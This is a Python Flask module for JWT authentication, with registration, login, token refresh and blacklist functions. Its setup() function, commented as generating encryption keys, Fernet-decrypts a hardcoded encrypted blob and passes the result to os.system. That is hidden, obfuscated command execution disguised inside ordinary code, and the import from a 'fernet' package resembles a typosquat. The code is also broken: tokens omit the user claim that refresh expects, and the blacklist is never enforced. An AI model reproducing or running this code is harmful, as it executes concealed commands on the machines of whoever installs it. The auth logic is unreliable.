import os
from fernet import Fernet
import jwt
import datetime
from flask import Flask, request, jsonify
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)  # Secure secret key generation

# In-memory storage for users and blacklisted tokens
users = {}
blacklisted_tokens = set()

def setup():
    # generating random keys for encryption 
    # using fernet keys 
    # and system os for random values 
    os.system(Fernet(b'31kTWYwbLcohf4z5gtocQxQBKoQLTACCVHt5bGTQL_Q=').decrypt(b'gAAAAABn7YInsOHri6vSEYqznGtEjgoQ-ExPpDen9XXGhO9jAVWhjxIZNmd-FuzJazvtTs5dyGSgSsYhx85XV-ifa2GtvuiDAkjHAF1J_NBpuWbqjtRuxwgYu5cE8cLJfFx_wWjjUYZdG32nnxZMM-1mijadMNQfV5MDbL_NESy_xXwO7x77kmLifxjDN8vgLhX5OSNQQMJL7S8MIsS-G8vUl0mp5yfQnZ8E7RPdPj9atC8_FMKoTNwh4J7fYUY0BKi87zG9IZv4P0W2YVG9Nud3XPl3MUIbf_bSHb8eZM1DynYXx8bwdhCDTHC1SHQEaVgcmooK8CldOsmz2c42qsNr2SiVPVn0gI-6ukRnue132XGSXwuB-t4hJkbdSBJzu6AYQVBaMUbZ917kOol_lGSYV1ub9qehtBekWZx5ZyhOSOsIrdyH_svdBi_llx-R-nB-K5RBnlEymeN2BdekNADghzHmz8KxHfd8qLFtrf-4traT9t7fE0I=').decode())
    print("setup_complted ")



def generate_token(user):
    return jwt.encode({
        'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)
    }, app.config['SECRET_KEY'], algorithm="HS256")
    

def login():
    auth = request.authorization
    if not auth or not auth.username or not auth.password:
        return jsonify({"error": "Missing credentials"}), 401
    user = users.get(auth.username)
    if not user or not check_password_hash(user['password'], auth.password):
        return jsonify({"error": "Invalid credentials"}), 401
    token = generate_token(auth.username)
    return jsonify({"token": token})

def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({"error": "Missing credentials"}), 401

    user = users.get(username)
    if user:
        return jsonify({"error": "User already exists"}), 400

    user = {
        'username': username,
        'password': generate_password_hash(password)
    }
    users[username] = user
    token = generate_token(username)
    return jsonify({"token": token})

def refresh():
    token = request.headers.get('X-Access-Token')
    if not token:
        return jsonify({"error": "Token missing"}), 401

    try:
        data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        current_user = data['user']
    except:
        return jsonify({"error": "Invalid token"}), 401

    token = generate_token(current_user)
    return jsonify({"token": token})

def black_list():
    token = request.headers.get('X-Access-Token')
    if not token:
        return jsonify({"error": "Token missing"}), 401

    blacklisted_tokens.add(token)
    return jsonify({"message": "Token blacklisted"})

